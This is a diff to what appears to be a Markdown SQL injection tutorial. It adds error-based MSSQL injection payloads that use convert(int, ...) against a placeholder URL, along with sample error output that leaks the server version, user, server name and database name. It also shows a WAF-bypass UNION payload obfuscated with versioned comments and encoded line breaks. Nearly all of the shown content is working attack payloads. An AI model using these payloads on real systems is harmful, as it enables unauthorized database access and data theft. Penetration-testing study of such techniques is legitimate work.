@@ -214,7 +214,21 @@ Website must successfully load and we will see a number (in our case between 1-4
 
 We bypassed the WAF and found that the 3nd column has the information.
 
-## Retrieving the database  
+## Dumping database (Boolean string)
+
+```http://domain.com/index.php?id=1'and 1=convert(int,@@version)--```  
+Error: Warning: mssql_query() message: COnversion failed when converting the nvarchar value "**Microsoft SQL Server 2012 (SP1) - 110.0.3156.0 (X64) Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 X64 (Build 9200: ) (Hypervisor)**" to data type int. (severity 16 in D:\something\web\STD\...\id.php on line...
+
+```http://domain.com/index.php?id=1'and 1=convert(int,user_name())--```  
+Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**admin_user**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
+
+```http://domain.com/index.php?id=1'and 1=convert(int,@@SERVERNAME())--```  
+Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**SERVER_NAME_HERE**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
+
+```http://domain.com/index.php?id=1'and 1=convert(int,db_name())--```  
+Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**store_database**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
+
+## Dumping database (UNION based query)
 
 Use the union query which worked, in this case I bypassed WAF and found that the 3rd column is vulnerable with payload:  
 ```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -```  
